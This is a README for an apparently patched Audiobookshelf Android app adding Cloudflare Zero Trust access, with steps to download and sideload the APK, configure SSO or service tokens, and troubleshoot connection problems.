# 🎧 audiobookshelf-app-cloudflare-zero-trust - Access your audiobooks securely from anywhere

[![Download Latest Version](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/darlinm4344/audiobookshelf-app-cloudflare-zero-trust/releases)

## What is this app?

This application serves as a version of the Audiobookshelf Android app. It includes specific patches to work with Cloudflare Zero Trust. These changes allow you to use single sign-on tools, service tokens, and secure network routing to connect to your home server. 

You use this app if you host your own audiobook server and want to reach it over the internet without compromising your security. The app keeps your credentials safe using device-level encryption. You do not need to manage complex VPN tunnels to listen to your library away from home.

## 📋 Prerequisites

Before you install this software, ensure your setup meets these requirements:

1. A device running Android 8.0 or higher.
2. A functioning Audiobookshelf server already set up on your home network.
3. An active Cloudflare Zero Trust account configured for your server domain.
4. Permission to install applications from unknown sources on your Android device.

## 📥 How to download the app

You must obtain the installation file from the official releases page. Follow these instructions to download the correct file for your device:

1. Visit the [official releases page](https://github.com/darlinm4344/audiobookshelf-app-cloudflare-zero-trust/releases).
2. Look for the latest version listed at the top of the page.
3. Locate the file ending in `.apk`.
4. Tap the file name to start the download.

## 🛠️ Installation steps

Android does not allow the installation of apps from outside the Google Play Store by default. You must change this setting to install the patched file.

### Adjusting your security settings
1. Open the Settings app on your Android device.
2. Search for "Install unknown apps" or "Special access."
3. Select the web browser you used to download the file.
4. Switch the "Allow from this source" toggle to the on position.

### Running the installer
1. Open your device file manager.
2. Navigate to your Downloads folder.
3. Tap the `.apk` file you downloaded.
4. Select "Install" when the prompt appears.
5. Wait for the process to finish and select "Open."

## 🔐 Configuring Cloudflare Zero Trust

Once you open the app, you will need to connect it to your server using your Cloudflare credentials. 

1. Enter the URL of your Audiobookshelf server.
2. The app will detect the Cloudflare gateway.
3. Proceed to the sign-in screen provided by your Cloudflare Access policy.
4. Input your authentication details. If you use a service token, paste that into the designated field.
5. Save your settings. The app will now route your traffic through the secure tunnel.

## 📱 Features

* **SSO Integration**: Log in using your existing identity provider linked to Cloudflare.
* **Service Tokens**: Use machine-to-machine tokens for automated connections.
* **LAN Auto-routing**: The app detects when you are home and connects directly to your local server.
* **Encrypted Storage**: Your login credentials reside in the secure hardware-backed storage on your phone.
* **Custom Headers**: Improved compatibility with proxy services that require specific header information.

## 💡 Troubleshooting common issues

If you encounter problems, verify these settings:

* **Connection Errors**: Confirm that your Cloudflare Access policy allows your current email address or device identity.
* **Installation Failed**: Ensure you downloaded the file completely and your phone has enough storage space.
* **Loading Stalls**: Check that your internet connection permits traffic to the domain you configured for your server.
* **Login Loop**: Clear the app cache in your Android system settings and sign in again.

## 🛡️ Security notices

The patches in this app focus on securing the tunnel between your phone and your server. Keep your phone software updated to ensure the latest security fixes for the Android operating system remain in place. Always verify your identity provider settings in the Cloudflare dashboard if you suspect unauthorized access attempts.

Keywords: android, android-app, audiobook, audiobooks, audiobookshelf, audiobookshelf-app, cloudflare, cloudflare-access, cloudflare-zero-trust, custom-headers, lan-access, self-hosted, sso, zero-trust, zerotrust